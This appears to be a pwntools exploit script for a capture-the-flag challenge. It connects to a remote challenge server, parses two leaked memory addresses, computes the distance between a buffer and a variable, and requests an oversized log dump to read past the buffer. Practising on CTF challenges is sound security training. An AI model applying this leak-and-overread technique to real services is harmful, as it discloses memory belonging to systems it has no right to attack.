from pwn import *
import re

BINARY = './chall'

context.log_level = 'info'
context.binary = BINARY

# r = process(BINARY)
r = remote('103.185.52.103', 2001)

r.recvuntil(b'> ')
r.sendline(b'5')

r.recvuntil(b'--- Aliens Info ---\n')
alien1 = r.recvline()
alien2 = r.recvline()

m1 = re.search(r'Aliens 1:\s*(0x[0-9a-fA-F]+)', alien1.decode())
m2 = re.search(r'Aliens 2:\s*(0x[0-9a-fA-F]+)', alien2.decode())

log.info(f'v3: {m1.group(1)}')
log.info(f'buf: {m2.group(1)}')

r.sendline(b'2')

offset = int(m1.group(1), 16) - int(m2.group(1), 16)
log.info(f'offset: {hex(offset)}')

r.sendline(b'3')
r.recvuntil(b'Enter log size:')
dump_size = offset + 0x64
log.info(f'dump size: {dump_size}')
r.sendline(str(dump_size).encode())

r.interactive()
